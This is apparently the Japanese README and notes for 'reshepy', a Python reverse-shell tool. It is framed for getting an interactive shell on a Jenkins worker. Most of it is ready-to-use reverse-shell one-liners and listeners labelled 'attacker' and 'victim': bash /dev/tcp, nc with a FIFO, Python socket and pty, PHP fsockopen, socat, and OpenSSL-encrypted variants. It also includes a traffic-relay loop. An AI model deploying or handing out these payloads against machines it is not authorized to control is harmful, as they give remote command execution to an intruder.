# reverse shell written in python

このコマンドの存在意義はvictimマシン上で，secure/nosecureなどをオプションで区別して起動できる点(pythonのone linerを上回る明示的なメリットはない)

## What is reverse shell?
* [Reverse Shell \(リバースシェル\) 入門 & 実践 \- 好奇心の足跡]( https://kusuwada.hatenablog.com/entry/2019/10/30/044325 )

## reverse shell use case
* 任意のコマンドを実行できるサーバであるが，インタラクティブな操作ができない場合
  * jenkinsのslave(victim) <-> my machine(attacker)

## how to install
``` bash
# victim machine
# for avoiding 'pip Installing collected packages: UNKNOWN'
pip3 install setuptools --upgrade
pip3 install https://github.com/umaumax/reshepy/archive/master.tar.gz
```

``` bash
# atacker machine
# mac
brew install socat
# ubuntu
sudo apt-get install -y socat
```

----

<!-- ## darwin -->
<!-- * [macos \- Create reverse shell using High Sierra? \- Ask Different]( https://apple.stackexchange.com/questions/324824/create-reverse-shell-using-high-sierra ) -->
<!-- ### attacker machine -->
<!-- ### victim machine -->

## TL;DR
* attacker machine
  * 基本的に自由な環境
    * 最低限`socat`がないと実作業には適さない
    * `openssl`はsecureな通信を実現したいならば欲しい
* victim machine
  * `openssl`さえあればsecureな通信が可能
  * `socat`があるに越したことはないが，`pty`(e.g. `python -c 'import pty; pty.spawn("/bin/sh")'`)での代用や直接バイナリをダウンロードする方法があるので，`socat`コマンドは必須ではない
    * e.g. [static\-binaries/socat at master · andrew\-d/static\-binaries]( https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat )

## reshepy DONE
* 通信のみはsecureで制御信号も受け付ける

## reshepy TODO
* attackerがclient証明書を利用するケース
* victimがserver証明書を利用するケース(only victim reshepy ok)
* ファイルを共有せずにone linerで上記の項目を実現し，完全にsecureとしたい

----

## ubuntu
### attacker machine
``` bash
nc -nvlp 8080
```

### victim machine
``` bash
bash -i >& /dev/tcp/localhost/8080 0>&1
```

## common (mac, ubuntu)
### attacker machine
``` bash
nc -nvl 8080
```

``` bash
# socat tcp-listen:8080,reuseaddr,fork stdout
# below command can handle signal and tab
socat $(tty),raw,echo=0 tcp-listen:8080,reuseaddr
```

### victim machine
``` bash
mkfifo myfifo
nc 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1
rm -f myfifo
```

これはptyを利用していないのでsocatと組み合わせても効果を発揮しない悪い例
``` bash
python -c 'import sys,socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],int(sys.argv[2])));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' 127.0.0.1 8080
```

socatもopensslもない状況のvictimでもpythonさえあればOK
``` bash
python -c 'import sys;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],int(sys.argv[2])));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' localhost 8080
```

``` bash
php -r '$sock=fsockopen($argv[1],intval($argv[2]));exec("/bin/bash -i <&3 >&3 2>&3");' 127.0.0.1 8080
```

``` bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:localhost:8080
```

``` bash
reshepy localhost:8080
```
ptyを内部で利用しているのでsocat対応済み

## FYI
* [PayloadsAllTheThings/Reverse Shell Cheatsheet\.md at master · swisskyrepo/PayloadsAllTheThings]( https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md?source=post_page-----c7598145282d---------------------- )
* `source`: [ersh\.py: a pure Python encrypted reverse shell \| Borderline]( https://blog.kwiatkowski.fr/?q=en/ersh )

## secure

[OpenSSLでReverse Shellの通信を暗号化する\(\+"Ctrl\+C"の対応\) \| 俺的備忘録 〜なんかいろいろ〜]( https://orebibou.com/2019/07/openssl%E3%81%A7reverse-shell%E3%81%AE%E9%80%9A%E4%BF%A1%E3%82%92%E6%9A%97%E5%8F%B7%E5%8C%96%E3%81%99%E3%82%8B%E3%82%AD%E3%83%BC%E3%83%90%E3%82%A4%E3%83%B3%E3%83%89%E5%AF%BE%E5%BF%9C/ )

* 通信内容はsecureだが，通信相手が正しいとはわからない

### attacker machine
``` bash
# openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 3650 -nodes
# Country Name (2 letter code) []: US
# Common Name (eg, fully qualified host name) []:www.localhost.com
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 3650 -nodes -subj "/C=US/ST=/L=/O=/OU=/CN=www.localhost.com/emailAddress=/"

openssl s_server -quiet -key key.pem -cert cert.pem -port 8080
```

`socat` secure version
``` bash
# verify=0: no client certificate check
socat $(tty),raw,echo=0 openssl-listen:8080,reuseaddr,cert=cert.pem,key=key.pem,verify=0
```

at darwin
`stty: stdin isn't a terminal`

* [OpenSSL: How to create a certificate with an empty subject? \- Stack Overflow]( https://stackoverflow.com/questions/26058406/openssl-how-to-create-a-certificate-with-an-empty-subject )
* [x509 \- OpenSSL: How to create a certificate with an empty subject DN? \- Super User]( https://superuser.com/questions/512673/openssl-how-to-create-a-certificate-with-an-empty-subject-dn )

### victim machine
pythonとopensslが使える場合
``` bash
rm -f .fifo; mkfifo .fifo;python -c 'import pty; pty.spawn("/bin/bash")' < .fifo 2>&1 | openssl s_client -quiet -connect localhost:8080 > .fifo;rm -f .fifo
```
pythonのspawn a TTY shell from an interpreterを利用することでsocat(fully tty reverse shell)なしでも制御コマンド対応となる

socatとopensslが使える場合
`socat` secure version
``` bash
socat openssl-connect:localhost:8080,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```
より安全に通信したい場合には`verify=1`とする?

* client側が適切なサーバかどうかを判定する処理
  * (ctrl-cやtab ok)

``` bash
reshepy -c cert.pem --host=www.localhost.com localhost:8080
```
* 上記のコマンドのcert.pemに該当する部分をbase64でencodeしてテキストベースで貼り付ければ余計なファイルは不要な状態となる
  * また，基本的に，victimが変なサーバに接続することを防止できれば，attackerが変なクライアントを受け入れてもそれほど問題はない
    * (attacker側はコマンドの送信と表示のみであることと，ユースケースとしてネットワーク的に外からのアクセスは受け付けない場所にあると仮定されるため)

----

## port forwarding
下記のコマンドを`attacker`のlocalで動作させれば通信内容を見ることができる
`localhost:8081`->`127.0.0.1:8080`
``` bash
mkfifo fifo
while true ; do nc -l 8081 < fifo | tee /dev/stderr | nc 127.0.0.1 8080 | tee /dev/stderr > fifo; done
rm -f fifo
```

----

## NOTE
* `attacker`と`victim`のコマンドの組み合わせは基本的に自由
* macでは`/dev/tcp/xxx`や`/dev/udp/xxx`などは利用できない
* attackerで`nc`を利用して待ち受けている場合は`ctrl-c`で`nc`が終了してしまう
  * `socat`を利用すればよいが，macには存在しない
* 通常は非暗号化状態で通信
* 接続直後に画面が乱れた場合には`stty sane`
